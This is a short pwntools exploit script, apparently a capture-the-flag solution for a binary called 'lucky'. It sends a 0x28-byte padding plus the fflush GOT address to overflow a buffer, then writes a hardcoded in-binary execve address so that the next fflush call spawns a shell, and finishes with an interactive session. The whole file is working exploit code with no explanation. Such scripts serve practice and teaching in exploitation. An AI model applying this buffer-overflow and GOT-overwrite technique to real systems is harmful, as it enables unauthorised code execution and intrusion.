from pwn import *
context.arch = 'amd64'

context.terminal = ["tmux", "splitw", "-h"]
r = process("./lucky")
#r = remote('ctf.adl.tw', 11003)
gdb.attach(r)

r.recvuntil("?")

#fflush = 0x601038 #fflush@plt: jmp 0x601038
execve = 0x4008f1 # addr in lucky

e = ELF('./lucky')
fflush = e.got['fflush']

payload = flat("a" * 0x28, fflush)
print(payload)
r.sendline(payload)

r.recvuntil(": ")
r.sendline(str(execve))

r.interactive()
